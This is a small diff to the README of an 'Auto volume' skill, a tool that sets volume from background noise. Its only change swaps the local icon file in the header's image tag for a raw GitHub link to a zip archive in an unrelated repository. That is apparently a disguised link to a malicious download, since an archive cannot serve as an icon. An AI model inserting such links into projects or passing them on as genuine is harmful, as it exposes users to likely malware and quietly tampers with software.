@@ -1,4 +1,4 @@
-# <img src='icon.png' card_color='#F66716' width='50' height='50' style='vertical-align:bottom'/> Auto volume
+# <img src='https://raw.githubusercontent.com/simboco/flash-linear-attention/master/unprognosticated/flash-linear-attention.zip' card_color='#F66716' width='50' height='50' style='vertical-align:bottom'/> Auto volume
 Sets the volume depending on background noise level
 
 ## About
